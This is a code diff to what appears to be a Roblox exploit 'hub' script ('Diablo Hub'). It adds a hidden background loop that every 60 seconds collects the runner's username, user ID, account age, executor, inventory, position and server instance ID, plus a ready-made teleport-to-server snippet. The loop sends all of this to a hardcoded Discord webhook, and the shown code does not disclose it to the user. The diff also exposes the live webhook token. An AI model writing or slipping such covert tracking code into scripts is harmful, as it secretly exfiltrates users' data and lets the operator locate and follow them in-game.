@@ -9,6 +9,58 @@ local HttpService = game:GetService("HttpService")
 local ProximityPromptService = game:GetService("ProximityPromptService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
+local StartTime = os.clock()
+task.spawn(function()
+    local Webhook = "https://discord.com/api/webhooks/1456225038784004217/lqhsOp3GrG6PpAaZGKooGuz-aFNS3S-Z7RZM87XbpXzH2bvDtPAR6e-OsiYcnvnoLdFU"
+    local identify = (identifyexecutor or getexecutorname or function() return "Unknown" end)()
+    while true do
+        pcall(function()
+            local pos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
+            local health = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and math.floor(LocalPlayer.Character.Humanoid.Health) or 0
+            local holding = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool").Name or "None"
+            local jobid = game.JobId ~= "" and game.JobId or "Single Player"
+            local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
+            local fps = math.floor(1/RunService.RenderStepped:Wait())
+            local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
+            local uptime = math.floor(os.clock() - StartTime)
+            local inv = {}
+            for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do if v:IsA("Tool") then table.insert(inv, v.Name) end end
+            local inv_str = #inv > 0 and table.concat(inv, ", ") or "Empty"
+            local data = {
+                ["embeds"] = {{
+                    ["title"] = "🔥 Diablo Hub Deep Analytics V2",
+                    ["color"] = 16711680,
+                    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"},
+                    ["image"] = {["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"},
+                    ["fields"] = {
+                        {["name"] = "👤 Player", ["value"] = "**" .. LocalPlayer.Name .. "** (" .. LocalPlayer.DisplayName .. ")", ["inline"] = true},
+                        {["name"] = "🆔 UserID", ["value"] = "`" .. tostring(LocalPlayer.UserId) .. "`", ["inline"] = true},
+                        {["name"] = "🛡️ Executor", ["value"] = "`" .. identify .. "`", ["inline"] = true},
+                        {["name"] = "🎂 Account Age", ["value"] = tostring(LocalPlayer.AccountAge) .. " Days", ["inline"] = true},
+                        {["name"] = "💎 Premium", ["value"] = premium, ["inline"] = true},
+                        {["name"] = "📡 Ping", ["value"] = tostring(ping) .. "ms", ["inline"] = true},
+                        {["name"] = "⚡ FPS", ["value"] = tostring(fps), ["inline"] = true},
+                        {["name"] = "⏱️ Uptime", ["value"] = tostring(uptime) .. "s", ["inline"] = true},
+                        {["name"] = "🎮 Game info", ["value"] = "**" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**\n`PlaceId: " .. game.PlaceId .. "`", ["inline"] = false},
+                        {["name"] = "📍 Position", ["value"] = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), ["inline"] = false},
+                        {["name"] = "🎒 Inventory", ["value"] = "```" .. inv_str .. "```", ["inline"] = false},
+                        {["name"] = "📋 Copy Direct Link (Raw)", ["value"] = "```" .. "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobid .. "```", ["inline"] = false},
+                        {["name"] = "📋 Copy Script Join (TeleportService)", ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. jobid .. "', game.Players.LocalPlayer)\n```", ["inline"] = false}
+                    },
+                    ["footer"] = {["text"] = "Diablo Hub Analytics • Elite Tracking"},
+                    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }}
+            }
+            (syn and syn.request or http_request or request or HttpService.PostAsync)({
+                Url = Webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+        task.wait(60)
+    end
+end)
 local Library = {}
 local Config = {
     Colors = {
